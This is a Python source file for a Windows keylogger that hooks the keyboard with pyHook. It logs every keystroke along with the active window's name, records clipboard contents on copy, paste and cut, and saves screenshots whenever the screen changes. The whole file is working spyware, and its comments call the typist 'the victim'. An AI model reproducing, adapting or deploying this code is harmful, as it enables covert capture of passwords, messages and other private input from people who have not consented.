#!/usr/bin/env python
#-*- coding:windows-1255 -*-
########################################################
# Name: Keylogger
# Site: http://nimrodlevy.co.il
# Keylogger is a type of surveillance software (considered to be either software or spyware)
# that has the capability to record every keystroke you make to a log file, usually encrypted.
# A keylogger recorder can record instant messages, e-mail, and any information you type at any time using your keyboard.
# The log file created by the keylogger can then be sent to a specified receiver.
# Some keylogger programs will also record any e-mail addresses you use and Web site URLs you visit.
# Keyloggers, as a surveillance tool,
# are often used by employers to ensureemployees use work computers for business purposes only.
# this keylogger captures the screen when the screen was a significant change, and save the keyboards
__author__ = 'El3ct71k'
__license__ = 'GPL v3'
__version__ = '2.0'
__email__ = 'El3ct71k@gmail.com'
########################################################
from PIL import ImageGrab
from time import strftime
from threading import Thread
from os import path, mkdir
import base64
import pythoncom
import pyHook
import win32clipboard

# Settings:
filename = "keylogger.txt"

Process = None                  # Process flag
inString = False                # String flag
capture = ''                    # Save encrypted 1024 characters

def logger(txt):                # append to log file
    log = open(filename, "a+")   # open file in write mode
    log.write(str(txt))         # write to file
    log.close()                 # close file


def charToString(event):
    global inString
    stack = str()               # Catch the content that comes to the log

    types = {                   # Types of copy and past keys
        3:  "\n[C] Copied to ClipBoard: ",
        22: "\n[V] Pasted from ClipBoard: ",
        24: "\n[X] Was cut to ClipBoard: ",
    }

    chars = {   # Special chars like CTRL+Z
        1: "[A]", 2: "[B]", 4: "[D]", 5: "[E]", 6: "[F]", 7: "[G]", 8: "[H]", 9: "[I]", 10: "[J]", 11: "[K]", 12: "[L]", 13: "[M]",
        14: "[N]", 15: "[O]", 16: "[P]", 17: "[Q]", 18: "[R]", 19: "[S]", 20: "[T]", 21: "[U]", 23: "[W]", 25: "[Y]", 26: "[Z]"
    }

    keys = {    # Keys with ascii like char
        "Return": "[Enter]", "Tab": "[Tab]", "Back": "[Backspace]",
    }

    if event.Ascii in types:
        win32clipboard.OpenClipboard()                      # Retrieve information from the Clipboard
        clipboard = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        stack += types[event.Ascii]+clipboard+"\n"
    else:
        if inString is False and event.Key not in keys:     # Checks whether a key after typing is typing characters
            stack += "\n[STRING]\n"
            inString = True
        if event.Key in keys:                               # Checks whether a key is typed
            if inString is True:
                stack += "\[/STRING]\n"
                inString = False
            stack += "\n"+keys[event.Key]+"\n"
        elif event.Ascii in chars:                          # Checks whether the victim combines a letters and key.
            stack += chars[event.Ascii]
        else:                                               # Checks whether the victim typing letters
            stack += chr(event.Ascii)
    return stack


def onKeyboardEvent(event):
    global Process, inString
    if Process != str(event.WindowName):                        # Check to see if the current window is a diffrent window
        if inString:
            logger("\"\n\n")
            inString = False
        logger("Window name: %s\r\n" % str(event.WindowName))   # Window name
        Process = str(event.WindowName)
    else:
        pass
    if event.Ascii and isChar(str(event.Ascii)) is True:        # Checks whether victim typing on key or letters
        stack = charToString(event)
        logger(stack)
    else:
        if inString:
            logger("\n[/STRING]\n")
            inString = False
        logger("[%s]\n" % event.Key)


def isChar(num):                                                # Checks whether a letter or key
    try:
        int(num)
        return True
    except ValueError:
        return False


def screenCapture():
    global capture
    try:
        if not path.isdir("ScreenShots"):                        # If ScreenShots folder is not exist, create him
            mkdir("ScreenShots")
        while True:
            im = ImageGrab.grab()
            newcapture = base64.b64encode(im.tostring())[:1024]  # Encrypt the image BASE64 and save an 1024 first chars
            if newcapture != capture or capture is '':
                capture = newcapture
                im.save("ScreenShots/%s.png" % strftime("%d-%m-%Y--%H-%M-%S"))  # Create screen shot
    except TypeError:
        pass


def main():
    Thread(target=screenCapture).start()                  # Call to `screenCapture` function
    hm = pyHook.HookManager()                             # create a hook manager
    hm.KeyDown = onKeyboardEvent                          # watch for all mouse events
    hm.HookKeyboard()                                      # set the hooks
    pythoncom.PumpMessages()                               # wait forever

if __name__ == '__main__':
    main()